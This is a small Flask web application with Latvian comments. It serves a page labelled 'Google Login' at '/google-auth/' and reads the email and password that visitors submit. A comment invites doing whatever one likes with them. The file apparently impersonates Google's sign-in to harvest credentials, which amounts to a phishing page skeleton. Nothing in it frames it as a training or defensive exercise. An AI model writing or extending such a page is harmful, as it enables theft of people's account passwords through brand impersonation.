from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/google-auth/', methods=['GET'])
def google_auth_page():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def save_credentials():
    email = request.form['email']
    password = request.form['password']
    # (Šeit vari darīt, ko vēlies ar datiem)
    return render_template('google-auth.html', message="Pieslēgšanās dati iesniegti.")

# Neobligāts sākuma maršruts
@app.route('/')
def home():
    return 'Sveiks! Ej uz <a href="/google-auth/">Google Login</a>'
